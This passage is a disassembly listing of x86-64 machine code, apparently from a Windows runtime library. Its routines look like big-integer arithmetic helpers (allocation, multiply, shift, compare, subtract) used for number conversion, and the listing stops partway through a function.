  409320:	48 ff e0             	rex.W jmp *%rax
  409323:	83 f8 02             	cmp    $0x2,%eax
  409326:	74 36                	je     0x40935e
  409328:	8b 05 12 40 0d 00    	mov    0xd4012(%rip),%eax        # 0x4dd340
  40932e:	83 f8 01             	cmp    $0x1,%eax
  409331:	75 1f                	jne    0x409352
  409333:	48 8b 1d 36 53 0d 00 	mov    0xd5336(%rip),%rbx        # 0x4de670
  40933a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  409340:	b9 01 00 00 00       	mov    $0x1,%ecx
  409345:	ff d3                	call   *%rbx
  409347:	8b 05 f3 3f 0d 00    	mov    0xd3ff3(%rip),%eax        # 0x4dd340
  40934d:	83 f8 01             	cmp    $0x1,%eax
  409350:	74 ee                	je     0x409340
  409352:	83 f8 02             	cmp    $0x2,%eax
  409355:	74 ad                	je     0x409304
  409357:	48 83 c4 28          	add    $0x28,%rsp
  40935b:	5b                   	pop    %rbx
  40935c:	5e                   	pop    %rsi
  40935d:	c3                   	ret
  40935e:	c7 05 d8 3f 0d 00 02 	movl   $0x2,0xd3fd8(%rip)        # 0x4dd340
  409365:	00 00 00 
  409368:	eb 9a                	jmp    0x409304
  40936a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  409370:	83 3d c9 3f 0d 00 02 	cmpl   $0x2,0xd3fc9(%rip)        # 0x4dd340
  409377:	74 07                	je     0x409380
  409379:	f3 c3                	repz ret
  40937b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  409380:	48 63 c9             	movslq %ecx,%rcx
  409383:	48 8d 05 d6 3f 0d 00 	lea    0xd3fd6(%rip),%rax        # 0x4dd360
  40938a:	48 8d 14 89          	lea    (%rcx,%rcx,4),%rdx
  40938e:	48 8d 0c d0          	lea    (%rax,%rdx,8),%rcx
  409392:	48 8b 05 6f 52 0d 00 	mov    0xd526f(%rip),%rax        # 0x4de608
  409399:	48 ff e0             	rex.W jmp *%rax
  40939c:	0f 1f 40 00          	nopl   0x0(%rax)
  4093a0:	53                   	push   %rbx
  4093a1:	48 83 ec 20          	sub    $0x20,%rsp
  4093a5:	b8 03 00 00 00       	mov    $0x3,%eax
  4093aa:	f0 87 05 8f 3f 0d 00 	lock xchg %eax,0xd3f8f(%rip)        # 0x4dd340
  4093b1:	83 f8 02             	cmp    $0x2,%eax
  4093b4:	74 0a                	je     0x4093c0
  4093b6:	48 83 c4 20          	add    $0x20,%rsp
  4093ba:	5b                   	pop    %rbx
  4093bb:	c3                   	ret
  4093bc:	0f 1f 40 00          	nopl   0x0(%rax)
  4093c0:	48 8b 1d a9 51 0d 00 	mov    0xd51a9(%rip),%rbx        # 0x4de570
  4093c7:	48 8d 0d 92 3f 0d 00 	lea    0xd3f92(%rip),%rcx        # 0x4dd360
  4093ce:	ff d3                	call   *%rbx
  4093d0:	48 8d 0d b1 3f 0d 00 	lea    0xd3fb1(%rip),%rcx        # 0x4dd388
  4093d7:	48 89 d8             	mov    %rbx,%rax
  4093da:	48 83 c4 20          	add    $0x20,%rsp
  4093de:	5b                   	pop    %rbx
  4093df:	48 ff e0             	rex.W jmp *%rax
  4093e2:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  4093e9:	1f 84 00 00 00 00 00 
  4093f0:	57                   	push   %rdi
  4093f1:	56                   	push   %rsi
  4093f2:	53                   	push   %rbx
  4093f3:	48 83 ec 20          	sub    $0x20,%rsp
  4093f7:	89 ce                	mov    %ecx,%esi
  4093f9:	31 c9                	xor    %ecx,%ecx
  4093fb:	e8 b0 fe ff ff       	call   0x4092b0
  409400:	83 fe 09             	cmp    $0x9,%esi
  409403:	7f 1c                	jg     0x409421
  409405:	48 8d 05 d4 35 0d 00 	lea    0xd35d4(%rip),%rax        # 0x4dc9e0
  40940c:	48 63 d6             	movslq %esi,%rdx
  40940f:	48 8b 1c d0          	mov    (%rax,%rdx,8),%rbx
  409413:	48 85 db             	test   %rbx,%rbx
  409416:	74 5c                	je     0x409474
  409418:	48 8b 0b             	mov    (%rbx),%rcx
  40941b:	48 89 0c d0          	mov    %rcx,(%rax,%rdx,8)
  40941f:	eb 33                	jmp    0x409454
  409421:	89 f1                	mov    %esi,%ecx
  409423:	bf 01 00 00 00       	mov    $0x1,%edi
  409428:	d3 e7                	shl    %cl,%edi
  40942a:	8d 47 ff             	lea    -0x1(%rdi),%eax
  40942d:	48 98                	cltq
  40942f:	48 8d 0c 85 27 00 00 	lea    0x27(,%rax,4),%rcx
  409436:	00 
  409437:	48 c1 e9 03          	shr    $0x3,%rcx
  40943b:	8d 09                	lea    (%rcx),%ecx
  40943d:	48 c1 e1 03          	shl    $0x3,%rcx
  409441:	e8 2a 0b 00 00       	call   0x409f70
  409446:	48 85 c0             	test   %rax,%rax
  409449:	48 89 c3             	mov    %rax,%rbx
  40944c:	74 1b                	je     0x409469
  40944e:	89 73 08             	mov    %esi,0x8(%rbx)
  409451:	89 7b 0c             	mov    %edi,0xc(%rbx)
  409454:	31 c9                	xor    %ecx,%ecx
  409456:	e8 15 ff ff ff       	call   0x409370
  40945b:	c7 43 14 00 00 00 00 	movl   $0x0,0x14(%rbx)
  409462:	c7 43 10 00 00 00 00 	movl   $0x0,0x10(%rbx)
  409469:	48 89 d8             	mov    %rbx,%rax
  40946c:	48 83 c4 20          	add    $0x20,%rsp
  409470:	5b                   	pop    %rbx
  409471:	5e                   	pop    %rsi
  409472:	5f                   	pop    %rdi
  409473:	c3                   	ret
  409474:	89 f1                	mov    %esi,%ecx
  409476:	bf 01 00 00 00       	mov    $0x1,%edi
  40947b:	48 8b 1d be fa 0c 00 	mov    0xcfabe(%rip),%rbx        # 0x4d8f40
  409482:	d3 e7                	shl    %cl,%edi
  409484:	8d 47 ff             	lea    -0x1(%rdi),%eax
  409487:	48 89 da             	mov    %rbx,%rdx
  40948a:	48 98                	cltq
  40948c:	48 8d 0c 85 27 00 00 	lea    0x27(,%rax,4),%rcx
  409493:	00 
  409494:	48 8d 05 a5 35 0d 00 	lea    0xd35a5(%rip),%rax        # 0x4dca40
  40949b:	48 29 c2             	sub    %rax,%rdx
  40949e:	48 c1 e9 03          	shr    $0x3,%rcx
  4094a2:	48 89 d0             	mov    %rdx,%rax
  4094a5:	83 e1 ff             	and    $0xffffffff,%ecx
  4094a8:	48 c1 f8 03          	sar    $0x3,%rax
  4094ac:	48 01 c8             	add    %rcx,%rax
  4094af:	48 3d 20 01 00 00    	cmp    $0x120,%rax
  4094b5:	77 86                	ja     0x40943d
  4094b7:	48 8d 04 cb          	lea    (%rbx,%rcx,8),%rax
  4094bb:	48 89 05 7e fa 0c 00 	mov    %rax,0xcfa7e(%rip)        # 0x4d8f40
  4094c2:	eb 8a                	jmp    0x40944e
  4094c4:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
  4094cb:	00 00 00 00 00 
  4094d0:	53                   	push   %rbx
  4094d1:	48 83 ec 20          	sub    $0x20,%rsp
  4094d5:	48 85 c9             	test   %rcx,%rcx
  4094d8:	48 89 cb             	mov    %rcx,%rbx
  4094db:	74 43                	je     0x409520
  4094dd:	83 79 08 09          	cmpl   $0x9,0x8(%rcx)
  4094e1:	7f 2d                	jg     0x409510
  4094e3:	31 c9                	xor    %ecx,%ecx
  4094e5:	e8 c6 fd ff ff       	call   0x4092b0
  4094ea:	48 63 53 08          	movslq 0x8(%rbx),%rdx
  4094ee:	48 8d 05 eb 34 0d 00 	lea    0xd34eb(%rip),%rax        # 0x4dc9e0
  4094f5:	48 8b 0c d0          	mov    (%rax,%rdx,8),%rcx
  4094f9:	48 89 1c d0          	mov    %rbx,(%rax,%rdx,8)
  4094fd:	48 89 0b             	mov    %rcx,(%rbx)
  409500:	31 c9                	xor    %ecx,%ecx
  409502:	48 83 c4 20          	add    $0x20,%rsp
  409506:	5b                   	pop    %rbx
  409507:	e9 64 fe ff ff       	jmp    0x409370
  40950c:	0f 1f 40 00          	nopl   0x0(%rax)
  409510:	48 83 c4 20          	add    $0x20,%rsp
  409514:	5b                   	pop    %rbx
  409515:	e9 c6 0a 00 00       	jmp    0x409fe0
  40951a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  409520:	48 83 c4 20          	add    $0x20,%rsp
  409524:	5b                   	pop    %rbx
  409525:	c3                   	ret
  409526:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40952d:	00 00 00 
  409530:	55                   	push   %rbp
  409531:	57                   	push   %rdi
  409532:	56                   	push   %rsi
  409533:	53                   	push   %rbx
  409534:	48 83 ec 28          	sub    $0x28,%rsp
  409538:	8b 71 14             	mov    0x14(%rcx),%esi
  40953b:	45 31 c9             	xor    %r9d,%r9d
  40953e:	4c 8d 59 18          	lea    0x18(%rcx),%r11
  409542:	48 89 cf             	mov    %rcx,%rdi
  409545:	49 63 d8             	movslq %r8d,%rbx
  409548:	48 63 d2             	movslq %edx,%rdx
  40954b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  409550:	47 8b 14 8b          	mov    (%r11,%r9,4),%r10d
  409554:	4c 0f af d2          	imul   %rdx,%r10
  409558:	49 01 da             	add    %rbx,%r10
  40955b:	4c 89 d3             	mov    %r10,%rbx
  40955e:	47 89 14 8b          	mov    %r10d,(%r11,%r9,4)
  409562:	49 83 c1 01          	add    $0x1,%r9
  409566:	48 c1 eb 20          	shr    $0x20,%rbx
  40956a:	44 39 ce             	cmp    %r9d,%esi
  40956d:	7f e1                	jg     0x409550
  40956f:	48 85 db             	test   %rbx,%rbx
  409572:	74 12                	je     0x409586
  409574:	3b 77 0c             	cmp    0xc(%rdi),%esi
  409577:	7d 19                	jge    0x409592
  409579:	48 63 c6             	movslq %esi,%rax
  40957c:	83 c6 01             	add    $0x1,%esi
  40957f:	89 5c 87 18          	mov    %ebx,0x18(%rdi,%rax,4)
  409583:	89 77 14             	mov    %esi,0x14(%rdi)
  409586:	48 89 f8             	mov    %rdi,%rax
  409589:	48 83 c4 28          	add    $0x28,%rsp
  40958d:	5b                   	pop    %rbx
  40958e:	5e                   	pop    %rsi
  40958f:	5f                   	pop    %rdi
  409590:	5d                   	pop    %rbp
  409591:	c3                   	ret
  409592:	8b 4f 08             	mov    0x8(%rdi),%ecx
  409595:	83 c1 01             	add    $0x1,%ecx
  409598:	e8 53 fe ff ff       	call   0x4093f0
  40959d:	48 85 c0             	test   %rax,%rax
  4095a0:	48 89 c5             	mov    %rax,%rbp
  4095a3:	74 33                	je     0x4095d8
  4095a5:	48 8d 48 10          	lea    0x10(%rax),%rcx
  4095a9:	48 63 47 14          	movslq 0x14(%rdi),%rax
  4095ad:	48 8d 57 10          	lea    0x10(%rdi),%rdx
  4095b1:	4c 8d 04 85 08 00 00 	lea    0x8(,%rax,4),%r8
  4095b8:	00 
  4095b9:	e8 aa 09 00 00       	call   0x409f68
  4095be:	48 89 f9             	mov    %rdi,%rcx
  4095c1:	48 89 ef             	mov    %rbp,%rdi
  4095c4:	e8 07 ff ff ff       	call   0x4094d0
  4095c9:	48 63 c6             	movslq %esi,%rax
  4095cc:	83 c6 01             	add    $0x1,%esi
  4095cf:	89 5c 87 18          	mov    %ebx,0x18(%rdi,%rax,4)
  4095d3:	89 77 14             	mov    %esi,0x14(%rdi)
  4095d6:	eb ae                	jmp    0x409586
  4095d8:	31 ff                	xor    %edi,%edi
  4095da:	eb aa                	jmp    0x409586
  4095dc:	0f 1f 40 00          	nopl   0x0(%rax)
  4095e0:	53                   	push   %rbx
  4095e1:	48 83 ec 20          	sub    $0x20,%rsp
  4095e5:	89 cb                	mov    %ecx,%ebx
  4095e7:	b9 01 00 00 00       	mov    $0x1,%ecx
  4095ec:	e8 ff fd ff ff       	call   0x4093f0
  4095f1:	48 85 c0             	test   %rax,%rax
  4095f4:	74 0a                	je     0x409600
  4095f6:	89 58 18             	mov    %ebx,0x18(%rax)
  4095f9:	c7 40 14 01 00 00 00 	movl   $0x1,0x14(%rax)
  409600:	48 83 c4 20          	add    $0x20,%rsp
  409604:	5b                   	pop    %rbx
  409605:	c3                   	ret
  409606:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40960d:	00 00 00 
  409610:	41 57                	push   %r15
  409612:	41 56                	push   %r14
  409614:	41 55                	push   %r13
  409616:	41 54                	push   %r12
  409618:	55                   	push   %rbp
  409619:	57                   	push   %rdi
  40961a:	56                   	push   %rsi
  40961b:	53                   	push   %rbx
  40961c:	48 83 ec 28          	sub    $0x28,%rsp
  409620:	4c 63 61 14          	movslq 0x14(%rcx),%r12
  409624:	4c 63 72 14          	movslq 0x14(%rdx),%r14
  409628:	48 89 cb             	mov    %rcx,%rbx
  40962b:	49 89 d7             	mov    %rdx,%r15
  40962e:	45 39 f4             	cmp    %r14d,%r12d
  409631:	7d 0f                	jge    0x409642
  409633:	44 89 e0             	mov    %r12d,%eax
  409636:	48 89 d3             	mov    %rdx,%rbx
  409639:	4d 63 e6             	movslq %r14d,%r12
  40963c:	49 89 cf             	mov    %rcx,%r15
  40963f:	4c 63 f0             	movslq %eax,%r14
  409642:	31 c9                	xor    %ecx,%ecx
  409644:	43 8d 34 34          	lea    (%r12,%r14,1),%esi
  409648:	3b 73 0c             	cmp    0xc(%rbx),%esi
  40964b:	0f 9f c1             	setg   %cl
  40964e:	03 4b 08             	add    0x8(%rbx),%ecx
  409651:	e8 9a fd ff ff       	call   0x4093f0
  409656:	48 85 c0             	test   %rax,%rax
  409659:	0f 84 b3 00 00 00    	je     0x409712
  40965f:	48 63 d6             	movslq %esi,%rdx
  409662:	48 8d 78 18          	lea    0x18(%rax),%rdi
  409666:	48 8d 6c 90 18       	lea    0x18(%rax,%rdx,4),%rbp
  40966b:	49 89 f8             	mov    %rdi,%r8
  40966e:	48 39 ef             	cmp    %rbp,%rdi
  409671:	73 10                	jae    0x409683
  409673:	41 c7 00 00 00 00 00 	movl   $0x0,(%r8)
  40967a:	49 83 c0 04          	add    $0x4,%r8
  40967e:	4c 39 c5             	cmp    %r8,%rbp
  409681:	77 f0                	ja     0x409673
  409683:	4c 8d 6b 18          	lea    0x18(%rbx),%r13
  409687:	4d 8d 57 18          	lea    0x18(%r15),%r10
  40968b:	4a 8d 5c a3 18       	lea    0x18(%rbx,%r12,4),%rbx
  409690:	4f 8d 64 b7 18       	lea    0x18(%r15,%r14,4),%r12
  409695:	4d 39 e2             	cmp    %r12,%r10
  409698:	73 4e                	jae    0x4096e8
  40969a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4096a0:	45 8b 1a             	mov    (%r10),%r11d
  4096a3:	49 83 c2 04          	add    $0x4,%r10
  4096a7:	45 85 db             	test   %r11d,%r11d
  4096aa:	74 33                	je     0x4096df
  4096ac:	48 89 fa             	mov    %rdi,%rdx
  4096af:	4c 89 e9             	mov    %r13,%rcx
  4096b2:	45 31 c9             	xor    %r9d,%r9d
  4096b5:	44 8b 01             	mov    (%rcx),%r8d
  4096b8:	44 8b 32             	mov    (%rdx),%r14d
  4096bb:	48 83 c1 04          	add    $0x4,%rcx
  4096bf:	4d 0f af c3          	imul   %r11,%r8
  4096c3:	4d 01 f0             	add    %r14,%r8
  4096c6:	4d 01 c8             	add    %r9,%r8
  4096c9:	4d 89 c1             	mov    %r8,%r9
  4096cc:	44 89 02             	mov    %r8d,(%rdx)
  4096cf:	48 83 c2 04          	add    $0x4,%rdx
  4096d3:	49 c1 e9 20          	shr    $0x20,%r9
  4096d7:	48 39 cb             	cmp    %rcx,%rbx
  4096da:	77 d9                	ja     0x4096b5
  4096dc:	44 89 0a             	mov    %r9d,(%rdx)
  4096df:	48 83 c7 04          	add    $0x4,%rdi
  4096e3:	4d 39 d4             	cmp    %r10,%r12
  4096e6:	77 b8                	ja     0x4096a0
  4096e8:	85 f6                	test   %esi,%esi
  4096ea:	7e 23                	jle    0x40970f
  4096ec:	44 8b 45 fc          	mov    -0x4(%rbp),%r8d
  4096f0:	48 8d 55 fc          	lea    -0x4(%rbp),%rdx
  4096f4:	45 85 c0             	test   %r8d,%r8d
  4096f7:	74 11                	je     0x40970a
  4096f9:	eb 14                	jmp    0x40970f
  4096fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  409700:	48 83 ea 04          	sub    $0x4,%rdx
  409704:	8b 0a                	mov    (%rdx),%ecx
  409706:	85 c9                	test   %ecx,%ecx
  409708:	75 05                	jne    0x40970f
  40970a:	83 ee 01             	sub    $0x1,%esi
  40970d:	75 f1                	jne    0x409700
  40970f:	89 70 14             	mov    %esi,0x14(%rax)
  409712:	48 83 c4 28          	add    $0x28,%rsp
  409716:	5b                   	pop    %rbx
  409717:	5e                   	pop    %rsi
  409718:	5f                   	pop    %rdi
  409719:	5d                   	pop    %rbp
  40971a:	41 5c                	pop    %r12
  40971c:	41 5d                	pop    %r13
  40971e:	41 5e                	pop    %r14
  409720:	41 5f                	pop    %r15
  409722:	c3                   	ret
  409723:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  40972a:	84 00 00 00 00 00 
  409730:	55                   	push   %rbp
  409731:	57                   	push   %rdi
  409732:	56                   	push   %rsi
  409733:	53                   	push   %rbx
  409734:	48 83 ec 28          	sub    $0x28,%rsp
  409738:	89 d0                	mov    %edx,%eax
  40973a:	48 89 cf             	mov    %rcx,%rdi
  40973d:	89 d3                	mov    %edx,%ebx
  40973f:	83 e0 03             	and    $0x3,%eax
  409742:	0f 85 89 00 00 00    	jne    0x4097d1
  409748:	c1 fb 02             	sar    $0x2,%ebx
  40974b:	85 db                	test   %ebx,%ebx
  40974d:	74 51                	je     0x4097a0
  40974f:	48 8b 35 5a 3c 0d 00 	mov    0xd3c5a(%rip),%rsi        # 0x4dd3b0
  409756:	48 85 f6             	test   %rsi,%rsi
  409759:	75 14                	jne    0x40976f
  40975b:	e9 c1 00 00 00       	jmp    0x409821
  409760:	d1 fb                	sar    $1,%ebx
  409762:	74 3c                	je     0x4097a0
  409764:	4c 8b 06             	mov    (%rsi),%r8
  409767:	4d 85 c0             	test   %r8,%r8
  40976a:	74 44                	je     0x4097b0
  40976c:	4c 89 c6             	mov    %r8,%rsi
  40976f:	f6 c3 01             	test   $0x1,%bl
  409772:	74 ec                	je     0x409760
  409774:	48 89 f2             	mov    %rsi,%rdx
  409777:	48 89 f9             	mov    %rdi,%rcx
  40977a:	e8 91 fe ff ff       	call   0x409610
  40977f:	48 85 c0             	test   %rax,%rax
  409782:	48 89 c5             	mov    %rax,%rbp
  409785:	74 6d                	je     0x4097f4
  409787:	48 89 f9             	mov    %rdi,%rcx
  40978a:	48 89 ef             	mov    %rbp,%rdi
  40978d:	e8 3e fd ff ff       	call   0x4094d0
  409792:	d1 fb                	sar    $1,%ebx
  409794:	75 ce                	jne    0x409764
  409796:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40979d:	00 00 00 
  4097a0:	48 89 f8             	mov    %rdi,%rax
  4097a3:	48 83 c4 28          	add    $0x28,%rsp
  4097a7:	5b                   	pop    %rbx
  4097a8:	5e                   	pop    %rsi
  4097a9:	5f                   	pop    %rdi
  4097aa:	5d                   	pop    %rbp
  4097ab:	c3                   	ret
  4097ac:	0f 1f 40 00          	nopl   0x0(%rax)
  4097b0:	b9 01 00 00 00       	mov    $0x1,%ecx
  4097b5:	e8 f6 fa ff ff       	call   0x4092b0
  4097ba:	48 8b 2e             	mov    (%rsi),%rbp
  4097bd:	48 85 ed             	test   %rbp,%rbp
  4097c0:	74 40                	je     0x409802
  4097c2:	b9 01 00 00 00       	mov    $0x1,%ecx
  4097c7:	48 89 ee             	mov    %rbp,%rsi
  4097ca:	e8 a1 fb ff ff       	call   0x409370
  4097cf:	eb 9e                	jmp    0x40976f
  4097d1:	83 e8 01             	sub    $0x1,%eax
  4097d4:	48 8d 15 6d 04 0d 00 	lea    0xd046d(%rip),%rdx        # 0x4d9c48
  4097db:	45 31 c0             	xor    %r8d,%r8d
  4097de:	48 98                	cltq
  4097e0:	8b 14 82             	mov    (%rdx,%rax,4),%edx
  4097e3:	e8 48 fd ff ff       	call   0x409530
  4097e8:	48 85 c0             	test   %rax,%rax
  4097eb:	48 89 c7             	mov    %rax,%rdi
  4097ee:	0f 85 54 ff ff ff    	jne    0x409748
  4097f4:	31 ff                	xor    %edi,%edi
  4097f6:	48 89 f8             	mov    %rdi,%rax
  4097f9:	48 83 c4 28          	add    $0x28,%rsp
  4097fd:	5b                   	pop    %rbx
  4097fe:	5e                   	pop    %rsi
  4097ff:	5f                   	pop    %rdi
  409800:	5d                   	pop    %rbp
  409801:	c3                   	ret
  409802:	48 89 f2             	mov    %rsi,%rdx
  409805:	48 89 f1             	mov    %rsi,%rcx
  409808:	e8 03 fe ff ff       	call   0x409610
  40980d:	48 85 c0             	test   %rax,%rax
  409810:	48 89 c5             	mov    %rax,%rbp
  409813:	48 89 06             	mov    %rax,(%rsi)
  409816:	74 dc                	je     0x4097f4
  409818:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  40981f:	eb a1                	jmp    0x4097c2
  409821:	b9 01 00 00 00       	mov    $0x1,%ecx
  409826:	e8 85 fa ff ff       	call   0x4092b0
  40982b:	48 8b 35 7e 3b 0d 00 	mov    0xd3b7e(%rip),%rsi        # 0x4dd3b0
  409832:	48 85 f6             	test   %rsi,%rsi
  409835:	74 0f                	je     0x409846
  409837:	b9 01 00 00 00       	mov    $0x1,%ecx
  40983c:	e8 2f fb ff ff       	call   0x409370
  409841:	e9 29 ff ff ff       	jmp    0x40976f
  409846:	b9 71 02 00 00       	mov    $0x271,%ecx
  40984b:	e8 90 fd ff ff       	call   0x4095e0
  409850:	48 85 c0             	test   %rax,%rax
  409853:	48 89 c6             	mov    %rax,%rsi
  409856:	48 89 05 53 3b 0d 00 	mov    %rax,0xd3b53(%rip)        # 0x4dd3b0
  40985d:	74 95                	je     0x4097f4
  40985f:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  409866:	eb cf                	jmp    0x409837
  409868:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40986f:	00 
  409870:	41 55                	push   %r13
  409872:	41 54                	push   %r12
  409874:	55                   	push   %rbp
  409875:	57                   	push   %rdi
  409876:	56                   	push   %rsi
  409877:	53                   	push   %rbx
  409878:	48 83 ec 28          	sub    $0x28,%rsp
  40987c:	48 89 cf             	mov    %rcx,%rdi
  40987f:	89 d6                	mov    %edx,%esi
  409881:	41 89 d5             	mov    %edx,%r13d
  409884:	44 8b 67 14          	mov    0x14(%rdi),%r12d
  409888:	c1 fe 05             	sar    $0x5,%esi
  40988b:	8b 47 0c             	mov    0xc(%rdi),%eax
  40988e:	8b 49 08             	mov    0x8(%rcx),%ecx
  409891:	41 01 f4             	add    %esi,%r12d
  409894:	41 8d 5c 24 01       	lea    0x1(%r12),%ebx
  409899:	39 c3                	cmp    %eax,%ebx
  40989b:	7e 0c                	jle    0x4098a9
  40989d:	0f 1f 00             	nopl   (%rax)
  4098a0:	01 c0                	add    %eax,%eax
  4098a2:	83 c1 01             	add    $0x1,%ecx
  4098a5:	39 c3                	cmp    %eax,%ebx
  4098a7:	7f f7                	jg     0x4098a0
  4098a9:	e8 42 fb ff ff       	call   0x4093f0
  4098ae:	48 85 c0             	test   %rax,%rax
  4098b1:	48 89 c5             	mov    %rax,%rbp
  4098b4:	0f 84 85 00 00 00    	je     0x40993f
  4098ba:	85 f6                	test   %esi,%esi
  4098bc:	4c 8d 48 18          	lea    0x18(%rax),%r9
  4098c0:	7e 1c                	jle    0x4098de
  4098c2:	45 31 c0             	xor    %r8d,%r8d
  4098c5:	43 c7 04 81 00 00 00 	movl   $0x0,(%r9,%r8,4)
  4098cc:	00 
  4098cd:	49 83 c0 01          	add    $0x1,%r8
  4098d1:	44 39 c6             	cmp    %r8d,%esi
  4098d4:	7f ef                	jg     0x4098c5
  4098d6:	8d 46 ff             	lea    -0x1(%rsi),%eax
  4098d9:	4c 8d 4c 85 1c       	lea    0x1c(%rbp,%rax,4),%r9
  4098de:	48 63 47 14          	movslq 0x14(%rdi),%rax
  4098e2:	44 89 ea             	mov    %r13d,%edx
  4098e5:	4c 8d 47 18          	lea    0x18(%rdi),%r8
  4098e9:	83 e2 1f             	and    $0x1f,%edx
  4098ec:	48 8d 74 87 18       	lea    0x18(%rdi,%rax,4),%rsi
  4098f1:	74 5d                	je     0x409950
  4098f3:	b8 20 00 00 00       	mov    $0x20,%eax
  4098f8:	45 31 db             	xor    %r11d,%r11d
  4098fb:	29 d0                	sub    %edx,%eax
  4098fd:	0f 1f 00             	nopl   (%rax)
  409900:	45 8b 10             	mov    (%r8),%r10d
  409903:	89 d1                	mov    %edx,%ecx
  409905:	41 d3 e2             	shl    %cl,%r10d
  409908:	89 c1                	mov    %eax,%ecx
  40990a:	45 09 da             	or     %r11d,%r10d
  40990d:	45 89 11             	mov    %r10d,(%r9)
  409910:	45 8b 18             	mov    (%r8),%r11d
  409913:	49 83 c0 04          	add    $0x4,%r8
  409917:	49 83 c1 04          	add    $0x4,%r9
  40991b:	41 d3 eb             	shr    %cl,%r11d
  40991e:	4c 39 c6             	cmp    %r8,%rsi
  409921:	77 dd                	ja     0x409900
  409923:	41 83 c4 02          	add    $0x2,%r12d
  409927:	45 85 db             	test   %r11d,%r11d
  40992a:	45 89 19             	mov    %r11d,(%r9)
  40992d:	41 0f 45 dc          	cmovne %r12d,%ebx
  409931:	83 eb 01             	sub    $0x1,%ebx
  409934:	48 89 f9             	mov    %rdi,%rcx
  409937:	89 5d 14             	mov    %ebx,0x14(%rbp)
  40993a:	e8 91 fb ff ff       	call   0x4094d0
  40993f:	48 89 e8             	mov    %rbp,%rax
  409942:	48 83 c4 28          	add    $0x28,%rsp
  409946:	5b                   	pop    %rbx
  409947:	5e                   	pop    %rsi
  409948:	5f                   	pop    %rdi
  409949:	5d                   	pop    %rbp
  40994a:	41 5c                	pop    %r12
  40994c:	41 5d                	pop    %r13
  40994e:	c3                   	ret
  40994f:	90                   	nop
  409950:	41 8b 10             	mov    (%r8),%edx
  409953:	49 83 c0 04          	add    $0x4,%r8
  409957:	41 89 11             	mov    %edx,(%r9)
  40995a:	49 83 c1 04          	add    $0x4,%r9
  40995e:	4c 39 c6             	cmp    %r8,%rsi
  409961:	77 ed                	ja     0x409950
  409963:	eb cc                	jmp    0x409931
  409965:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  40996c:	00 00 00 00 
  409970:	4c 63 4a 14          	movslq 0x14(%rdx),%r9
  409974:	8b 41 14             	mov    0x14(%rcx),%eax
  409977:	44 29 c8             	sub    %r9d,%eax
  40997a:	75 2b                	jne    0x4099a7
  40997c:	4e 8d 0c 8d 10 00 00 	lea    0x10(,%r9,4),%r9
  409983:	00 
  409984:	4c 8d 41 18          	lea    0x18(%rcx),%r8
  409988:	4a 8d 54 0a 08       	lea    0x8(%rdx,%r9,1),%rdx
  40998d:	4a 8d 4c 09 08       	lea    0x8(%rcx,%r9,1),%rcx
  409992:	48 83 ea 04          	sub    $0x4,%rdx
  409996:	48 83 e9 04          	sub    $0x4,%rcx
  40999a:	44 8b 0a             	mov    (%rdx),%r9d
  40999d:	44 39 09             	cmp    %r9d,(%rcx)
  4099a0:	75 0e                	jne    0x4099b0
  4099a2:	49 39 c8             	cmp    %rcx,%r8
  4099a5:	72 eb                	jb     0x409992
  4099a7:	f3 c3                	repz ret
  4099a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4099b0:	19 c0                	sbb    %eax,%eax
  4099b2:	83 c8 01             	or     $0x1,%eax
  4099b5:	c3                   	ret
  4099b6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4099bd:	00 00 00 
  4099c0:	57                   	push   %rdi
  4099c1:	56                   	push   %rsi
  4099c2:	53                   	push   %rbx
  4099c3:	48 83 ec 20          	sub    $0x20,%rsp
  4099c7:	48 89 cb             	mov    %rcx,%rbx
  4099ca:	48 89 d7             	mov    %rdx,%rdi
  4099cd:	e8 9e ff ff ff       	call   0x409970
  4099d2:	83 f8 00             	cmp    $0x0,%eax
  4099d5:	0f 84 e5 00 00 00    	je     0x409ac0
  4099db:	0f 8c 01 01 00 00    	jl     0x409ae2
  4099e1:	31 f6                	xor    %esi,%esi
  4099e3:	8b 4b 08             	mov    0x8(%rbx),%ecx
  4099e6:	e8 05 fa ff ff       	call   0x4093f0
  4099eb:	48 85 c0             	test   %rax,%rax
  4099ee:	0f 84 01 01 00 00    	je     0x409af5
  4099f4:	44 8b 5b 14          	mov    0x14(%rbx),%r11d
  4099f8:	89 70 10             	mov    %esi,0x10(%rax)
  4099fb:	4c 8d 43 18          	lea    0x18(%rbx),%r8
  4099ff:	4c 8d 48 18          	lea    0x18(%rax),%r9
  409a03:	4c 8d 57 18          	lea    0x18(%rdi),%r10
  409a07:	49 63 d3             	movslq %r11d,%rdx
  409a0a:	48 8d 74 93 18       	lea    0x18(%rbx,%rdx,4),%rsi
  409a0f:	48 63 57 14          	movslq 0x14(%rdi),%rdx
  409a13:	48 8d 7c 97 18       	lea    0x18(%rdi,%rdx,4),%rdi
  409a18:	31 d2                	xor    %edx,%edx
  409a1a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  409a20:	41 8b 1a             	mov    (%r10),%ebx
  409a23:	41 8b 08             	mov    (%r8),%ecx
  409a26:	49 83 c2 04          	add    $0x4,%r10
  409a2a:	49 83 c0 04          	add    $0x4,%r8
  409a2e:	48 29 d9             	sub    %rbx,%rcx
  409a31:	48 29 d1             	sub    %rdx,%rcx
